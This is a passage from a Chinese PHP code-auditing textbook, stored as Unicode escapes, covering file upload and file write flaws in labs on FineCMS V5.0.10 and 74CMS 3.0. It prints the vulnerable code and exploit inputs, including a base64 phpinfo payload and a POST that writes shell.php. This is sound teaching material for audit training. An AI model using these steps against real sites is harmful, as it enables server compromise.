\u4E0A\u4F20\u7684\u6587\u4EF6\u4E3Atest.php\u5185\u5BB9\u4E3A<?php phpinfo();?>\uFF0C\u4E0A\u4F20\u8FC7\u7A0B\u4E2D\u4F7F\u7528BurpSuite\u8FDB\u884C\u6570\u636E\u5305\u62E6\u622A\uFF0C\u62E6\u622A\u6570\u636E\u5305\u5982\u56FE8-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image420.jpg)\r
\r
\u56FE8-2 %00\u622A\u65AD\u6570\u636E\u5305\u56FE\r
\r
### 8.1.4 \u5B9E\u9A8C\uFF1AFineCMS\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9FineCMS\u7684V5.0.10\u7248\u672C\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\u5728FineCMS V5\u7248\u672C\u4E2D/finecms/dayrui/controllers/member/Account.php\u6587\u4EF6\u4E2D\u7684\u51FD\u6570\u5B58\u5728\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u5B58\u5728\u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u4E0A\u4F20\u4E00\u53E5\u8BDD\u6728\u9A6C\u6587\u4EF6\u3002\u8BE5\u6F0F\u6D1E\u6D89\u53CA\u5230FineCMS V5.2\u7248\u672C\u524D\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80038.1.1\u8282\uFF1A\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7B80\u4ECB\uFF1B8.1.2\u8282\uFF1A\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\uFF1B8.1.3\u8282\uFF1A \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7ED5\u8FC7\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BFineCMS V5.0.10\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\`\`\`\r
FineCMS V5.0.10\u662F\u57FA\u4E8ECI\u6846\u67B6\u8FDB\u884C\u5F00\u53D1\u7684\uFF0C\u7F51\u7AD9\u7684\u529F\u80FD\u70B9\u90FD\u5728PHP\u6587\u4EF6\u7684\u7C7B\u4E2D\u5B9A\u4E49\u3002\u8BE5CMS\u5728\u201C\u4F1A\u5458\u5934\u50CF\u4FEE\u6539\u201D\u529F\u80FD\u70B9\u5B58\u5728\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u5BF9\u8BE5\u529F\u80FD\u70B9\u8FDB\u884C\u5BA1\u8BA1\u5206\u6790\u3002\u67E5\u770B\u8BE5CMS\u7684/finecms/dayrui/controllers/member/Account.php\u6587\u4EF6\u4E2Dupload\u51FD\u6570\uFF0C\u90E8\u5206\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
public function upload() {\r
// \u521B\u5EFA\u56FE\u7247\u5B58\u50A8\u6587\u4EF6\u5939\r
$dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';//\u5B58\u50A8\u6587\u4EF6\u8DEF\u5F84\r
@dr_dir_delete($dir);\r
!is_dir($dir) && dr_mkdirs($dir);  //\u5224\u65AD\u662F\u5426\u4E3A\u6587\u4EF6\u5939\u4E0E\u521B\u5EFA\u6587\u4EF6\u5939\r
    if ($_POST['tx']) {\r
        $file = str_replace(' ', '+', $_POST['tx']);//\u5B57\u7B26\u66FF\u6362\r
//\u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D\u662F\u5426\u6EE1\u8DB3\u6761\u4EF6\r
        if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){\r
            $new_file = $dir.'0x0.'.$result[2];\r
//\u82E5\u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\u6210\u529F\u5219\u5C06\u6587\u4EF6\u5185\u5BB9\u4E0A\u4F20\u81F3\u6587\u4EF6\u4E2D\r
            if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {\r
                exit(dr_json(0, '\u76EE\u5F55\u6743\u9650\u4E0D\u8DB3\u6216\u78C1\u76D8\u5DF2\u6EE1'));\r
            } else {\r
//\u5B9A\u4E49config\u6570\u7EC4\u5185\u5BB9\r
                $this->load->library('image_lib');\r
$config['create_thumb'] = TRUE;\r
$config['thumb_marker'] = '';\r
$config['maintain_ratio'] = FALSE;\r
$config['source_image'] = $new_file;\r
\r
\u4E0A\u8FF0upload\u51FD\u6570\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
l  \u9996\u5148\u5B9A\u4E49\u4E86\u6587\u4EF6\u7684\u5B58\u50A8\u4F4D\u7F6E\u4E3A$dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/'\uFF0C\u5373\u201C\u7CFB\u7EDF\u8DEF\u5F84/member/{uid}/\u201D\r
l  \u4F7F\u7528preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)\u5BF9HTTP POST\u65B9\u5F0F\u63D0\u4EA4\u7684\u5185\u5BB9\u8FDB\u884C\u6B63\u5219\u5339\u914D\uFF0C\u82E5\u5339\u914D\u6210\u529F\u5219\u751F\u6210\u6587\u4EF6\u540D\u3002\r
l  \u8C03\u7528file_put_contents\u51FD\u6570\u5C06\u6587\u4EF6\u7684\u5185\u5BB9\u5199\u8FDB\u521A\u521A\u751F\u6210\u7684\u6587\u4EF6\u4E2D\uFF08\u6587\u4EF6\u540D\u4E3A\u53D8\u91CF$new_file\uFF09\u3002\r
\u8BE5\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u552F\u4E00\u7684\u8FC7\u6EE4\u70B9\u4E3A\u6B63\u5219\u8868\u8FBE\u5F0F/^(data:\\s*image\\/(\\w+);base64,)/\u3002\u8BE5\u6B63\u5219\u8868\u8FBE\u5F0F\u5B58\u5728\u7684\u95EE\u9898\u662F\uFF1A\u5BF9\u4E8E\u201Cimage\\(/w+)\u201D\u800C\u8A00\uFF0C\u5982\u679C\u63D0\u4EA4\u7684\u8BF7\u6C42\u662Fimage/php\uFF0C\u6587\u4EF6\u4E5F\u53EF\u4EE5\u8FDB\u884C\u4E0A\u4F20\u5E76\u751F\u6210php\u683C\u5F0F\u6587\u4EF6\u3002\u53EF\u4EE5\u5229\u7528\u8BE5\u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\u4E0D\u4E25\u683C\u7684\u6F0F\u6D1E\u5F62\u6210\u6587\u4EF6\u4E0A\u4F20\u3002\r
\`\`\`\r
\r
\uFF082\uFF09\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5229\u7528\r
\r
\u9996\u5148\u767B\u9646FineCMS\u7BA1\u7406\u5E73\u53F0\uFF0C\u7528\u6237\u540D\u4E3Aadmin\u3001\u5BC6\u7801\u4E3Aadmin\uFF0CURL\u8DEF\u5F84\u4E3A\uFF1Ahttp://ip/ index.php\uFF0C\u7136\u540E\u70B9\u51FB\u201C\u4F1A\u5458\u4E2D\u5FC3\u201D\u3001\u201C\u4E0A\u4F20\u5934\u50CF\u201D\uFF0C\u5982\u56FE8-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image422.jpg)\r
\r
\`\`\`\r
\u56FE8-3 \u4E0A\u4F20\u5934\u50CF\u56FE\r
\`\`\`\r
\r
\u5236\u4F5C\u6076\u610F\u4EE3\u7801\u6587\u4EF6\uFF0C\u5BF9\u201C<?php phpinfo();?>\u201D\u8FDB\u884CBase64\u7F16\u7801\uFF0C\u7F16\u7801\u540E\u7ED3\u679C\u4E3A\u201CPD9waHAgcGhwaW5mbygpOz8+\u201D\uFF0C\u6587\u4EF6\u540D\u79F0\u4E3A0.png\u3002\u4E0A\u4F20\u8BE5\u6587\u4EF6\u5E76\u4F7F\u7528BurpSuite\u5BF9\u6570\u636E\u5305\u8FDB\u884C\u62E6\u622A\u4FEE\u6539\uFF0C\u4FEE\u6539\u540E\u6570\u636E\u5305\u5982\u56FE8-4\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image424.jpg)\r
\r
\`\`\`\r
\u56FE8-4\u4E0A\u4F20\u6076\u610F\u4EE3\u7801\u62E6\u622A\u56FE\r
\`\`\`\r
\r
  \u8BBF\u95EE\u5DF2\u4E0A\u4F20\u7684\u6076\u610F\u811A\u672C\uFF0CURL\u8DEF\u5F84\u4E3A\uFF1Ahttp://ip/uploadfile/member/1/0x0.php\uFF0C\u6210\u529F\u663E\u793A\u8BE5\u6076\u610F\u6587\u4EF6\u5185\u5BB9\uFF0C\u5982\u56FE8-5\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image426.gif)\r
\r
\`\`\`\r
\u56FE8-5\u6076\u610F\u4EE3\u7801\u6D4B\u8BD5\u56FE\r
\`\`\`\r
\r
## 8.2 \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5\r
\r
### 8.2.1 \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u4E0D\u540C\u4E8E\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u51FA\u73B0\u7684\u539F\u56E0\u7ECF\u5E38\u7531\u4E8EWeb\u5E94\u7528\u540E\u53F0\u7684\u4E00\u4E9B\u6587\u4EF6\u4FEE\u6539\u7F16\u8F91\u5904\uFF0C\u7A0B\u5E8F\u5F00\u53D1\u8FC7\u7A0B\u4E2D\u5C06\u8FD9\u4E9B\u6587\u4EF6\u4FE1\u606F\u672A\u505A\u597D\u8FC7\u6EE4\u4FDD\u5B58\u5230\u4E86\u6587\u4EF6\u4E2D\uFF0C\u7528\u6237\u53EF\u4EE5\u5728\u6587\u4EF6\u4E2D\u5199\u5165\u4EFB\u610F\u7684\u5185\u5BB9\uFF0C\u5BFC\u81F4\u6F0F\u6D1E\u4EA7\u751F\u3002\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u53EF\u4EE5\u76F4\u63A5Getshell\uFF0C\u5371\u5BB3\u5F88\u5927\u3002\u4F46\u5728\u6E17\u900F\u6D4B\u8BD5\u4E2D\uFF0C\u5F80\u5F80\u51FA\u73B0\u5728CMS\u4E2D\u3002\u4E0D\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u7684\u60C5\u51B5\u4E0B\u5F88\u96BE\u76F4\u63A5\u83B7\u53D6\u6743\u9650\uFF0C\u4E3B\u8981\u662F\u56E0\u4E3A\u653B\u51FB\u8005\u65E0\u6CD5\u5224\u65AD\u6076\u610F\u4EE3\u7801\u5199\u5165\u5230\u4E86\u54EA\u4E2A\u6587\u4EF6\u4E2D\u3002\r
\r
\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u9700\u8981\u7684\u524D\u63D0\u6761\u4EF6\u5305\u62EC\uFF1A\r
\r
l \u6587\u4EF6\u5199\u5165\u51FD\u6570\u7684\u53C2\u6570\u7528\u6237\u53EF\u63A7\uFF1B\r
\r
l \u53EF\u63A7\u53C2\u6570\u6CA1\u6709\u505A\u597D\u8FC7\u6EE4\uFF1B\r
\r
l \u5199\u5165\u7684\u6587\u4EF6\u7C7B\u578B\u4E3A\u53EF\u6267\u884C\u6587\u4EF6\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6587\u4EF6\u5199\u5165\u7684\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php\r
\r
$api = addslashes($_GET['api']);\r
\r
file_put_contents('./option.php', $api);\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u76F4\u63A5\u901A\u8FC7HTTP\u7684GET\u65B9\u6CD5\u4F20\u9012\u53C2\u6570api\uFF0C\u5C06api\u5185\u5BB9\u5199\u5165\u5230\u5F53\u524D\u6587\u4EF6\u5939\u7684option.php\u6587\u4EF6\u4E2D\u3002\u5F53\u8BBF\u95EEhttp://ip/test.php?api=<?php phpinfo();?>\u65F6\uFF0C\u6587\u4EF6option.php\u4E2D\u5199\u5165\u6076\u610F\u4EE3\u7801<?php phpinfo();?>\u3002\r
\r
### 8.2.2 \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u4E5F\u76F8\u5BF9\u7B80\u5355\uFF0C\u4ECE\u7F51\u7AD9\u529F\u80FD\u8FDB\u884C\u5BA1\u8BA1\u800C\u8A00\uFF0C\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7ECF\u5E38\u51FA\u73B0\u5728\uFF1A\u6570\u636E\u5E93\u5907\u4EFD\u3001\u6587\u4EF6\u4E0A\u4F20\u3001\u6A21\u677F\u5907\u4EFD\u3001\u6587\u4EF6\u5907\u4EFD\u7B49\u529F\u80FD\u70B9\u3002\u5728\u8FDB\u884C\u9ED1\u76D2\u6D4B\u8BD5\u65F6\u53EF\u7740\u91CD\u5173\u6CE8\u4E0A\u8FF0\u7684\u529F\u80FD\u70B9\u8FDB\u884C\u540E\u7EED\u5BA1\u8BA1\u3002\r
\r
\u4ECE\u51FD\u6570\u641C\u7D22\u800C\u8A00\uFF0CPHP\u4EE3\u7801\u7684\u6587\u4EF6\u5199\u5165\u7684\u5E38\u89C1\u51FD\u6570\u5305\u62EC\uFF1A\r
\r
l fopen\u51FD\u6570\uFF1A\u6253\u5F00\u6587\u4EF6\u6216\u8005URL\u8DEF\u5F84\uFF0C\u5982\u679C\u6253\u5F00\u5931\u8D25\u5219\u8FD4\u56DEFalse\uFF1B\r
\r
l fwrite\u51FD\u6570\uFF1A\u5C06\u5185\u5BB9\u5199\u5165\u5230\u4E00\u4E2A\u6253\u5F00\u7684\u6587\u4EF6\u4E2D\uFF0C\u82E5\u6267\u884C\u6210\u529F\u5219\u8FD4\u56DE\u5199\u5165\u7684\u5B57\u8282\u6570\uFF0C\u5426\u5219\u8FD4\u56DEFalse\uFF1B\r
\r
l fputs\u51FD\u6570\uFF1A\u4E0Efwrite\u51FD\u6570\u7C7B\u4F3C\uFF1B\r
\r
l file_put_contents\u51FD\u6570\uFF1A\u628A\u4E00\u6BB5\u5B57\u7B26\u4E32\u5199\u5165\u6587\u4EF6\u4E2D\u3002\r
\r
\u5176\u4ED6\u9700\u8981\u6CE8\u610F\u7684\u51FD\u6570\u8FD8\u5305\u62EC\uFF1Afputcsv()\u3001socket_write()\u3001session_write_close()\u3001imagefttext()\u3001imagettftext()\u3002\u5FEB\u901F\u6316\u6398\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u53EA\u9700\u5168\u5C40\u641C\u7D22\u4E0A\u8FF0\u8FD9\u4E9B\u51FD\u6570\u540D\uFF0C\u5B9A\u4F4D\u9700\u8981\u5BA1\u8BA1\u7684\u4EE3\u7801\u4F4D\u7F6E\uFF0C\u540C\u65F6\u5BA1\u8BA1\u8BE5\u51FD\u6570\u7684\u53C2\u6570\u662F\u5426\u53EF\u63A7\u4E0E\u8FC7\u6EE4\u60C5\u51B5\u5373\u53EF\u3002\r
\r
\u5E38\u89C1\u7684\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u4EE3\u7801\u5BA1\u8BA1\u601D\u8DEF\u662F\uFF1A\u9996\u5148\u5BFB\u627E\u6587\u4EF6\u5199\u5165\u6216\u6587\u4EF6\u4FDD\u5B58\u7B49\u76F8\u5173\u51FD\u6570\uFF0C\u7136\u540E\u6839\u636E\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u65B9\u6CD5\uFF0C\u786E\u5B9A\u51FD\u6570\u4E2D\u53D8\u91CF\u662F\u5426\u7528\u6237\u53EF\u63A7\uFF0C\u8FC7\u6EE4\u5904\u7406\u662F\u5426\u4E25\u683C\uFF0C\u662F\u5426\u4FDD\u5B58\u5230\u4E86\u53EF\u6267\u884C\u6587\u4EF6\u4E2D\u3002\u4F7F\u7528\u5E38\u89C1\u7684\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u53EF\u4EE5\u5F88\u597D\u7684\u81EA\u52A8\u626B\u63CF\u51FA\u6B64\u7C7B\u6F0F\u6D1E\uFF0C\u5F53\u7136\u4E5F\u9700\u8981\u4EBA\u5DE5\u53BB\u9010\u4E2A\u5206\u6790\u6392\u67E5\u3002\r
\r
### 8.2.3 \u5B9E\u9A8C\uFF1A74CMS3.0\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF974CMS\u7684V3.0\u7248\u672C\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u3002\u572874CMS V3.0\u7248\u672C\u4E2D\u7BA1\u7406\u7CFB\u7EDF\u7684\u7F16\u8F91\u6A21\u677F\u529F\u80FD\u5B58\u5728\u5BF9\u5199\u5165\u6587\u4EF6\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u5199\u5165\u6076\u610F\u4EE3\u7801\uFF0C\u7F16\u8F91\u6A21\u677F\u7684\u6587\u4EF6\u662F/admin/admin_templates.php\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80038.2.1\u8282\uFF1A\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7B80\u4ECB\uFF1B8.2.2\u8282\uFF1A\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS V3.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BF974CMS3.0\u5168\u5C40\u641C\u7D22\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570fopen\uFF0C\u5982\u56FE8-6\u6240\u793A\u3002\u5173\u6CE8\u8C03\u7528fopen\u51FD\u6570\u7684\u540C\u65F6\uFF0C\u67E5\u770B\u8BE5\u51FD\u6570\u5BF9\u6587\u4EF6\u7684\u6743\u9650\u63A7\u5236\u60C5\u51B5\uFF0C\u7740\u91CD\u5BA1\u8BA1\u6743\u9650\u4E3A\u201Cw\u201D\uFF08\u5199\u6743\u9650\uFF09\u3001\u201Cw+\u201D\uFF08\u8BFB\u5199\u6743\u9650\uFF09\u90E8\u5206\u4EE3\u7801\u3002\r
\r
admin\\admin_templates.php\u6587\u4EF6\u4E2D\u5B58\u5728@fopen($file_dir, 'wb'))\u8BED\u53E5\uFF0C\u5176\u4E3A\u6587\u4EF6\u5206\u914D\u6743\u9650\u4E3A\u201Cwb\u201D\uFF08\u5199\u5165\u6743\u9650\uFF09\u3002\u5BF9\u8BE5\u6587\u4EF6\u4E2Dfopen\u51FD\u6570\u7684\u53C2\u6570\u8FD0\u884C\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u786E\u5B9A\u53C2\u6570\u4F20\u9012\u6D41\u7A0B\uFF0C\u540C\u65F6\u786E\u5B9A\u662F\u5426\u5B58\u5728\u8FC7\u6EE4\u60C5\u51B5\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image428.jpg)\r
\r
\`\`\`\r
\u56FE8-6 \u5168\u5C40\u641C\u7D22fopen\u56FE\r
\`\`\`\r
\r
admin\\admin_templates.php\u6587\u4EF6\u90E8\u5206\u4EE3\u7801\u6D41\u7A0B\uFF1A\r
\r
l \u5F53\u4F20\u9012\u53C2\u6570$act\u4E3Ado_edit\u65F6\uFF0C\u8C03\u7528check_permissions\u51FD\u6570\u5BF9\u7528\u6237\u767B\u5F55\u72B6\u6001\u8FDB\u884C\u6821\u9A8C\u3002\r
\r
l \u5224\u65AD\u6A21\u677F\u540D\u79F0\u662F\u5426\u4E3A\u7A7A\u5E76\u5BF9\u6A21\u677F\u5185\u5BB9\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5728\u5BF9\u6A21\u677F\u5185\u5BB9\u8FDB\u884C\u8FC7\u6EE4\u7684\u8FC7\u7A0B\u4E2D\u8C03\u7528deep_stripslashes\u51FD\u6570\u3002\r
\r
l \u4F7F\u7528$_POST[\u2018tpl_dir\u2019]\u62FC\u63A5\u6587\u4EF6\u4FDD\u5B58\u8DEF\u5F84\uFF0C\u6700\u540E\u4F7F\u7528fopen\u51FD\u6570\u6253\u5F00\u6587\u4EF6\uFF0C\u4F7F\u7528fwrite\u51FD\u6570\u5199\u5165\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
\r
\r
elseif ($act == 'do_edit')\r
 {\r
  //\u8C03\u7528check_permisssions\u51FD\u6570\u68C0\u67E5\u7528\u6237\u767B\u5F55\u72B6\u6001\u4E0E\u6743\u9650\u6821\u9A8C\r
\r
**check_permissions($_SESSION['admin_purview'],"tpl_edit");**\r
\r
//\u6A21\u677F\u540D\u79F0\u8C03\u7528trim\u51FD\u6570\u9996\u5C3E\u53BB\u7A7A\u683C**\r
**  $tpl_name = !empty($_POST['tpl_name']) ? trim($_POST['tpl_name']) : '';\r
  //\u6A21\u677F\u5185\u5BB9tpl_content\u8C03\u7528deep_stripslashes\u51FD\u6570\u8FDB\u884C\u7279\u6B8A\u5B57\u7B26\u8FC7\u6EE4\r
\r
 $tpl_content = !empty($_POST['tpl_content']) ? **deep_stripslashes**($_POST['tpl_content']) : '';\r
    if(empty($tpl_name)){\r
  adminmsg('\u4FDD\u5B58\u6A21\u677F\u6587\u4EF6\u51FA\u9519', 0);\r
    }\r
\r
//\u6587\u4EF6\u8DEF\u5F84\u62FC\u63A5\r
    **$file_dir='../templates/'.$_POST['tpl_dir'].'/'.$tpl_name;**\r
\r
**//\u4F7F\u7528fopen\u51FD\u6570\u6253\u5F00\u6587\u4EF6\u4E14\u5177\u6709\u5199\u6743\u9650\r
**    if(!$handle = **@fopen($file_dir, 'wb')**){\r
    adminmsg("\u6253\u5F00\u76EE\u6807\u6A21\u7248\u6587\u4EF6 $tpl_name \u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u6A21\u7248\u76EE\u5F55\u7684\u6743\u9650",0);\r
    }\r
\r
**//\u4F7F\u7528fwrite\u51FD\u6570\u5411\u6587\u4EF6\u4E2D\u5199\u5165\u6587\u4EF6\u5185\u5BB9**\r
    if(**fwrite($handle, $tpl_content)** === false){\r
     adminmsg('\u5199\u5165\u76EE\u6807 $tpl_name \u5931\u8D25,\u8BF7\u68C0\u67E5\u8BFB\u5199\u6743\u9650',0);\r
    }\r
    fclose($handle);\r
    $link[0]['text'] = "\u7EE7\u7EED\u7F16\u8F91\u6B64\u6587\u4EF6";\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4E2D\u5BF9\u6587\u4EF6\u5185\u5BB9\u8C03\u7528\u4E86deep_stripslashes\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u8BE5\u51FD\u6570\u6700\u540E\u53EA\u4F7F\u7528stripslashes\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002stripslashes\u51FD\u6570\u7684\u4F5C\u7528\u662F\u5220\u9664\u7531addslashes\u51FD\u6570\u6DFB\u52A0\u7684\u53CD\u659C\u6760\uFF0C\u5176\u5E76\u6CA1\u6709\u4E25\u683C\u7684\u8FC7\u6EE4\u6548\u679C\u3002\u56E0\u6B64\uFF0C\u53EF\u4EE5\u5229\u7528\u5BF9\u6A21\u677F\u5185\u5BB9\u8FC7\u6EE4\u4E0D\u4E25\u683C\u7684\u7279\u6027\uFF0C\u5411\u6A21\u677F\u5185\u5BB9\u4E2D\u5199\u5165\u6076\u610F\u6267\u884C\u4EE3\u7801\u3002\r
\r
\uFF082\uFF09  \u786E\u5B9A\u8BE5\u529F\u80FD\u8BBF\u95EE\u6D41\u7A0B\r
\r
74CMS3.0\u4E2D\u89E6\u53D1\u201Cdo_edit\u201D\u52A8\u4F5C\u7684\u524D\u53F0\u9875\u9762\u4E3A/temp/templates_c/admin_templates_file_edit.htm.php\u6587\u4EF6\uFF0C\u5982\u56FE8-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image430.jpg)\r
\r
\`\`\`\r
\u56FE8-7 \u524D\u53F0\u9875\u9762\u4EE3\u7801\r
\`\`\`\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4E2D\u7684FORM\u8868\u5355\u89E6\u53D1admin_templates.php\u6587\u4EF6\u4E2D\u7684\u7F16\u8F91\u6A21\u677F\u6A21\u5757\uFF0C\u540C\u65F6\u5176\u8BE5\u529F\u80FD\u5BF9\u5E94\u7684\u524D\u53F0\u9875\u9762\u4E3A74CMS3.0\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDF\u4E2D\u7684\u201C\u6A21\u677F\u7F16\u8F91\u201D\u529F\u80FD\uFF0C\u5982\u56FE8-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image432.jpg)\r
\r
\`\`\`\r
\u56FE8-8 \u6A21\u677F\u7F16\u8F91\u529F\u80FD\u56FE\r
\`\`\`\r
\r
\u81F3\u6B64\u5DF2\u5BF9\u8BE5\u7CFB\u7EDF\u7684\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u6D41\u7A0B\u8FDB\u884C\u5168\u9762\u4E86\u89E3\uFF0C\u5176\u201C\u6A21\u677F\u7F16\u8F91\u201D\u529F\u80FD\u672A\u5BF9\u5185\u5BB9\u8FDB\u884C\u4E25\u683C\u7684\u8FC7\u6EE4\uFF0C\u5176\u8C03\u7528\u6D41\u7A0B\u5982\u56FE8-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image434.jpg)\r
\r
\`\`\`\r
\u56FE8-9 %00\u6A21\u677F\u7F16\u8F91\u529F\u80FD\u6D41\u7A0B\u56FE\r
\`\`\`\r
\r
\uFF083\uFF09  \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u5229\u7528\r
\r
\u9996\u5148\u5728\u5DF2\u7ECF\u767B\u5F5574CMS\u540E\u53F0\u7BA1\u7406\u5E73\u53F0\u7684\u524D\u63D0\u4E0B\uFF0C\u8BBF\u95EE\u8DEF\u5F84\uFF1Ahttp://ip/admin/admin_templates.php?act=do_edit\uFF0C\u7136\u540E\u518D\u5229\u7528Hackbar\u63D2\u4EF6\uFF08\u6309F12\u952E\u8C03\u7528\uFF09\u901A\u8FC7POST\u65B9\u5F0F\u6784\u5EFA\u6587\u4EF6\u540D\u548C\u6587\u4EF6\u5185\u5BB9\uFF0C\u5982\u56FE8-10\u6240\u793A\u3002\r
\r
POST\u6570\u636E\u4E3Atpl_name=shell.php&tpl_content=<?php phpinfo();?>\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image436.gif)\r
\r
\`\`\`\r
\u56FE8-10 \u6587\u4EF6\u4E0A\u4F20\u5229\u7528\u56FE\r
\`\`\`\r
\r
